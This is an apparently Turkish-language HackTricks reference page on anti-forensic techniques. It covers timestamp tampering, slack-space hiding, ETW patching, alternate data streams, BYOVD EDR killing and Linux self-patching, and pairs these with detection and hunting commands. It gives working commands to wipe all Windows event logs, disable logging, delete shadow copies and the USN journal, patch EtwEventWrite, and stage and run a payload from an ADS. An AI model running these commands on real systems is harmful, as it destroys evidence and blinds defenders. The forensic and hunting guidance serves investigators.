# Anti-Forensic Techniques

{{#include ../../banners/hacktricks-training.md}}

## Timestamps

Bir saldırgan, tespit edilmekten kaçınmak için **dosyaların zaman damgalarını değiştirmekle** ilgilenebilir.\
Zaman damgalarını MFT içinde `$STANDARD_INFORMATION` \_\_ ve \_\_ `$FILE_NAME` özniteliklerinde bulmak mümkündür.

Her iki öznitelikte de 4 zaman damgası bulunur: **Modification**, **access**, **creation** ve **MFT registry modification** (MACE veya MACB).

**Windows explorer** ve diğer araçlar bilgileri **`$STANDARD_INFORMATION`** içinden gösterir.

### TimeStomp - Anti-forensic Tool

Bu araç, **`$STANDARD_INFORMATION`** içindeki zaman damgası bilgilerini **değiştirir**, ancak **`$FILE_NAME`** içindeki bilgileri **değiştirmez**. Bu nedenle **şüpheli** **etkinlikleri** **belirlemek** mümkündür.

### Usnjrnl

**USN Journal** (Update Sequence Number Journal), birim değişikliklerini takip eden NTFS'nin (Windows NT file system) bir özelliğidir. [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) aracı, bu değişikliklerin incelenmesine olanak tanır.

![TimeStomp - Anti-forensic Tool - Usnjrnl: The USN Journal (Update Sequence Number Journal) is a feature of the NTFS (Windows NT file system) that keeps track of volume changes. The...](<../../images/image (801).png>)

Önceki görsel, dosyada bazı **değişikliklerin yapıldığının** gözlemlenebildiği **tool** çıktısını göstermektedir.

### $LogFile

Bir file system üzerindeki **tüm metadata değişiklikleri**, [write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging) olarak bilinen bir süreçte günlüğe kaydedilir. Günlüğe kaydedilen metadata, bir NTFS file system kök dizininde bulunan `**$LogFile**` adlı bir dosyada tutulur. Bu dosyayı ayrıştırmak ve değişiklikleri belirlemek için [LogFileParser](https://github.com/jschicht/LogFileParser) gibi araçlar kullanılabilir.

![Usnjrnl - $LogFile: All metadata changes to a file system are logged in a process known as write-ahead logging. The logged metadata is kept in a file named $LogFile , located in the root...](<../../images/image (137).png>)

Yine tool çıktısında **bazı değişikliklerin yapıldığını** görmek mümkündür.

Aynı tool kullanılarak zaman damgalarının **hangi zamana değiştirildiği** belirlenebilir:

![Usnjrnl - $LogFile: Using the same tool it's possible to identify to which time the timestamps were modified](<../../images/image (1089).png>)

- CTIME: Dosyanın oluşturulma zamanı
- ATIME: Dosyanın değiştirilme zamanı
- MTIME: Dosyanın MFT registry değiştirilme zamanı
- RTIME: Dosyanın erişim zamanı

### `$STANDARD_INFORMATION` and `$FILE_NAME` comparison

Şüpheli şekilde değiştirilmiş dosyaları belirlemenin başka bir yolu, **uyuşmazlıkları** aramak için her iki öznitelikteki zamanı karşılaştırmaktır.

### Nanoseconds

**NTFS** zaman damgaları **100 nanosaniye** hassasiyete sahiptir. Bu nedenle 2010-10-10 10:10:**00.000:0000 gibi zaman damgalarına sahip dosyaların bulunması çok şüphelidir**.

### SetMace - Anti-forensic Tool

Bu araç hem `$STARNDAR_INFORMATION` hem de `$FILE_NAME` özniteliklerini değiştirebilir. Ancak Windows Vista'dan itibaren bu bilgiyi değiştirmek için çalışan bir işletim sistemi gerekir.

## Data Hiding

NFTS bir cluster ve minimum bilgi boyutunu kullanır. Bu, bir dosya bir cluster'ın bir buçuk katını kaplıyorsa, **kalan yarının dosya silinene kadar hiçbir zaman kullanılmayacağı** anlamına gelir. Bu durumda **slack space içine veri gizlemek** mümkündür.

slacker gibi araçlar verilerin bu "gizli" alana gizlenmesine olanak tanır. Ancak `$logfile` ve `$usnjrnl` analizi bazı verilerin eklendiğini gösterebilir:

![SetMace - Anti-forensic Tool - Data Hiding: There are tools like slacker that allow hiding data in this "hidden" space. However, an analysis of the $logfile and $usnjrnl can show that...](<../../images/image (1060).png>)

Ardından FTK Imager gibi araçlarla slack space'i geri almak mümkündür. Bu tür araçların içeriği obfuscated veya hatta encrypted şekilde kaydedebileceğini unutmayın.

## UsbKill

Bu araç, USB portlarında herhangi bir değişiklik algılanırsa **bilgisayarı kapatır**.\
Bunu keşfetmenin bir yolu çalışan process'leri incelemek ve **çalışan her Python script'ini gözden geçirmektir**.

## Live Linux Distributions

Bu distro'lar **RAM** belleği içinde **çalıştırılır**. Bunları tespit etmenin tek yolu, NTFS file-system'in **write permissions ile mount edilmesi** durumudur. Yalnızca read permissions ile mount edilmişse intrusion'ı tespit etmek mümkün olmaz.

## Secure Deletion

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

## Windows Configuration

Forensics investigation'ı çok daha zor hale getirmek için çeşitli Windows logging yöntemlerini devre dışı bırakmak mümkündür.

### Disable Timestamps - UserAssist

Bu, kullanıcı tarafından her executable'ın çalıştırıldığı tarih ve saatleri tutan bir registry key'dir.

UserAssist'i devre dışı bırakmak iki adım gerektirir:

1. UserAssist'i devre dışı bırakmak istediğimizi belirtmek için `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` ve `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled` registry key'lerinin ikisini de sıfıra ayarlayın.
2. `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>` gibi görünen registry subtree'lerini temizleyin.

### Disable Timestamps - Prefetch

Bu, Windows sisteminin performansını artırmak amacıyla çalıştırılan uygulamalar hakkında bilgi kaydeder. Ancak bu bilgiler forensics çalışmaları için de yararlı olabilir.

- `regedit` çalıştırın
- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters` file path'ini seçin
- Hem `EnablePrefetcher` hem de `EnableSuperfetch` üzerine sağ tıklayın
- Her biri için Modify'ı seçerek değeri 1'den (veya 3'ten) 0'a değiştirin
- Restart

### Disable Timestamps - Last Access Time

Bir Windows NT server üzerinde bir NTFS volume'dan her folder açıldığında sistem, last access time olarak adlandırılan **her listelenen folder üzerindeki timestamp field'ını güncellemek** için zamanı kaydeder. Yoğun kullanılan bir NTFS volume üzerinde bu durum performansı etkileyebilir.

1. Registry Editor'ı (Regedit.exe) açın.
2. `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem` konumuna gidin.
3. `NtfsDisableLastAccessUpdate` değerini arayın. Mevcut değilse bu DWORD'u ekleyin ve değerini 1 olarak ayarlayın; bu işlem devre dışı bırakılır.
4. Registry Editor'ı kapatın ve server'ı yeniden başlatın.

### Delete USB History

Tüm **USB Device Entries**, PC'nize veya Laptop'ınıza bir USB Device bağladığınızda oluşturulan sub key'leri içeren **USBSTOR** registry key'i altında Windows Registry'de saklanır. Bu key'i burada bulabilirsiniz: `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **Bunu silmek**, USB history'yi siler.\
Bunları sildiğinizden emin olmak (ve silmek) için [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) tool'unu da kullanabilirsiniz.

USB'ler hakkında bilgi kaydeden başka bir dosya da `C:\Windows\INF` içindeki `setupapi.dev.log` dosyasıdır. Bu da silinmelidir.

### Disable Shadow Copies

`vssadmin list shadowstorage` ile shadow copy'leri **listeleyin**\
`vssadmin delete shadow` çalıştırarak bunları **silin**

[https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html) adresindeki adımları izleyerek bunları GUI üzerinden de silebilirsiniz.

Shadow copy'leri devre dışı bırakmak için [buradaki adımlar](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):

1. Windows start button'a tıkladıktan sonra text search box'a "services" yazarak Services programını açın.
2. Listeden "Volume Shadow Copy" öğesini bulun, seçin ve sağ tıklayarak Properties'e erişin.
3. "Startup type" açılır menüsünden Disabled'ı seçin ve Apply ile OK'e tıklayarak değişikliği onaylayın.

Shadow copy'de hangi dosyaların kopyalanacağını `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot` registry'sinde değiştirmek de mümkündür.

### Overwrite deleted files

- Bir **Windows tool** kullanabilirsiniz: `cipher /w:C`. Bu komut, cipher'a C drive içindeki kullanılabilir boş disk alanındaki tüm verileri kaldırmasını söyler.
- [**Eraser**](https://eraser.heidi.ie) gibi araçları da kullanabilirsiniz.

### Delete Windows event logs

- Windows + R --> eventvwr.msc --> "Windows Logs" öğesini genişletin --> Her kategoriye sağ tıklayın ve "Clear Log"u seçin
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Disable Windows event logs

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- Services bölümünde "Windows Event Log" service'ini devre dışı bırakın
- `WEvtUtil.exec clear-log` veya `WEvtUtil.exe cl`

### Disable $UsnJrnl

- `fsutil usn deletejournal /d c:`

---

## Advanced Logging & Trace Tampering (2023-2025)

### PowerShell ScriptBlock/Module Logging

Windows 10/11 ve Windows Server'ın güncel sürümleri,
`Microsoft-Windows-PowerShell/Operational` altında (4104/4105/4106 event'leri) **zengin PowerShell forensic artifact'ları** tutar.
Saldırganlar bunları anlık olarak devre dışı bırakabilir veya silebilir:
```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
-Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
-Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
Remove-WinEvent               # requires admin & Win11 23H2+
```
Savunucular, bu registry key'lerdeki değişiklikleri ve yüksek hacimli PowerShell event'lerinin kaldırılmasını izlemelidir.

### ETW (Event Tracing for Windows) Patch

Endpoint security ürünleri büyük ölçüde ETW'ye güvenir. 2024'te yaygın olan bir evasion yöntemi, bellekteki `ntdll!EtwEventWrite`/`EtwEventWriteFull` işlevlerine patch uygulayarak her ETW çağrısının event'i oluşturmadan `STATUS_SUCCESS` döndürmesini sağlamaktır:<sup>[[5]](#references)</sup>
```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
patch, sizeof(patch), NULL);
```
Public PoC'ler (ör. `EtwTiSwallow`) aynı primitive'i PowerShell veya C++ ile uygular.
Patch **process-local** olduğu için diğer process'lerin içinde çalışan EDR'ler bunu gözden kaçırabilir.<sup>[[5]](#references)</sup>
Detection: bellekteki `ntdll` ile diskteki `ntdll`'yi karşılaştırın veya user-mode'dan önce hook uygulayın.

### Alternate Data Streams (ADS) Revival

2023'teki malware campaign'lerinde (ör. **FIN12** loader'ları), geleneksel scanner'ların görüş alanından uzak kalmak için second-stage binary'lerini ADS içinde staging ettikleri görüldü:
```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```
Akışları `dir /R`, `Get-Item -Stream *` veya Sysinternals `streams64.exe` ile listeleyin.
Host dosyasının FAT/exFAT'e veya SMB üzerinden kopyalanması, gizli akışı kaldırır ve araştırmacılar tarafından
payload'u kurtarmak için kullanılabilir.

### BYOVD & “AuKill” (2023)

Bring-Your-Own-Vulnerable-Driver, ransomware
saldırılarında **anti-forensics** amacıyla artık rutin olarak kullanılmaktadır.
Açık kaynaklı **AuKill** aracı, imzalı ancak güvenlik açığı bulunan bir driver'ı (`procexp152.sys`) yükleyerek
şifreleme ve log destruction işlemlerinden **önce** EDR ve forensic sensörlerini askıya alır veya sonlandırır:<sup>[[1]](#references)</sup>
```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```
Sürücü daha sonra kaldırılır ve geride minimum düzeyde artifact bırakır.<sup>[[1]](#references)</sup>
Mitigations: Microsoft vulnerable-driver blocklist'i (HVCI/SAC) etkinleştirin
ve kullanıcı tarafından yazılabilir yollardan kernel-service oluşturulması konusunda uyarı verin.

---

## Linux Anti-Forensics: Self-Patching and Cloud C2 (2023–2025)

### Self-patching compromised services to reduce detection (Linux)
Adversaries, yeniden exploitation'ı önlemek ve vulnerability tabanlı detection'ları bastırmak için bir servisi exploit ettikten hemen sonra giderek daha fazla “self-patch” ediyor. Buradaki fikir, vulnerable bileşenleri en güncel legitimate upstream binary/JAR dosyalarıyla değiştirmektir; böylece scanner'lar host'un patched olduğunu bildirirken persistence ve C2 çalışmaya devam eder.<sup>[[3]](#references)</sup>

Example: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604).<sup>[[3]](#references)[[4]](#references)</sup>
- Post-exploitation aşamasında saldırganlar Maven Central'dan (repo1.maven.org) legitimate JAR dosyaları indirdi, ActiveMQ kurulumundaki vulnerable JAR dosyalarını sildi ve broker'ı yeniden başlattı.
- Bu işlem initial RCE'yi kapatırken diğer foothold'ları (cron, SSH config değişiklikleri ve ayrı C2 implant'ları) korudu.

Operasyonel örnek (temsili)
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```
Forensic/hunting ipuçları
- Planlanmamış binary/JAR değiştirmeleri için service dizinlerini inceleyin:
- Debian/Ubuntu: `dpkg -V activemq` komutunu çalıştırın ve dosya hash'lerini/paths değerlerini repo mirror'larıyla karşılaştırın.
- Diskte package manager tarafından sahiplenilmeyen JAR sürümlerini veya out of band güncellenmiş symbolic link'leri arayın.
- Timeline: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` komutunu kullanarak ctime/mtime değerlerini compromise zaman aralığıyla ilişkilendirin.
- Shell history/process telemetry: initial exploitation sonrasında `repo1.maven.org` veya diğer artifact CDN'lerine yönelik `curl`/`wget` kanıtlarını arayın.
- Change management: yalnızca patched version'ın mevcut olduğunu doğrulamakla kalmayın; “patch”i kimin ve neden uyguladığını doğrulayın.

### Bearer token'lar ve anti-analysis stager'ları ile Cloud-service C2
Gözlemlenen tradecraft, birden fazla long-haul C2 path'ini ve anti-analysis packaging'i birleştirmiştir:<sup>[[3]](#references)</sup>
- Sandboxing ve static analysis'i zorlaştırmak için password-protected PyInstaller ELF loader'ları (ör. encrypted PYZ, `/_MEI*` altında temporary extraction).
- Indicators: `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS` gibi `strings` sonuçları.
- Runtime artifacts: `/tmp/_MEI*` veya özel `--runtime-tmpdir` path'lerine extraction.
- Hardcoded OAuth Bearer token'ları kullanan Dropbox-backed C2
- Network markers: `Authorization: Bearer <token>` ile birlikte `api.dropboxapi.com` / `content.dropboxapi.com`.
- Normalde dosya sync etmeyen server workload'larından Dropbox domain'lerine yapılan outbound HTTPS bağlantılarını proxy/NetFlow/Zeek/Suricata içinde hunt edin.
- Tunneling üzerinden parallel/backup C2 (ör. Cloudflare Tunnel `cloudflared`); kanallardan biri engellense bile control'ü korur.
- Host IOCs: `cloudflared` process/unit'leri, `~/.cloudflared/*.json` config'i ve Cloudflare edge'lerine outbound 443 bağlantıları.

### Erişimi sürdürmek için persistence ve “hardening rollback” (Linux örnekleri)
Attackers sıklıkla self-patching'i durable access path'leriyle birleştirir:<sup>[[3]](#references)</sup>
- Cron/Anacron: periyodik execution için her `/etc/cron.*/` directory'sindeki `0anacron` stub'ında yapılan değişiklikler.
- Hunt:
```bash
for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
```
- SSH configuration hardening rollback: root login'lerini etkinleştirme ve low-privileged account'ların default shell'lerini değiştirme.
- Root login etkinleştirmesini hunt edin:
```bash
grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
# flag values like "yes" or overly permissive settings
```
- System account'ları (ör. `games`) üzerindeki suspicious interactive shell'leri hunt edin:
```bash
awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
```
- Disk'e bırakılan ve aynı zamanda cloud C2 ile iletişim kuran random, kısa isimli beacon artifact'leri (8 alphabetic karakter):
- Hunt:
```bash
find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
-exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
```

Defenders, initial exploitation'ı gizlemek için kullanılan anti-forensic self-remediation'ı ortaya çıkarmak üzere bu artifact'leri external exposure ve service patching event'leriyle ilişkilendirmelidir.

## References

- [1] [Sophos X-Ops – AuKill: EDR'yi Devre Dışı Bırakmak İçin Weaponized Vulnerable Driver (Mart 2023)](https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr)
- [2] [Red Canary – Stealth İçin EtwEventWrite Patching: Detection & Hunting (Haziran 2024)](https://redcanary.com/blog/etw-patching-detection)
- [3] [Red Canary – Persistence İçin Patching: DripDropper Linux Malware Cloud İçinde Nasıl İlerliyor](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [4] [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
- [5] [.NET'inizi Gizlemek - ETW (Adam Chester / XPN)](https://blog.xpnsec.com/hiding-your-dotnet-etw/)
{{#include ../../banners/hacktricks-training.md}}
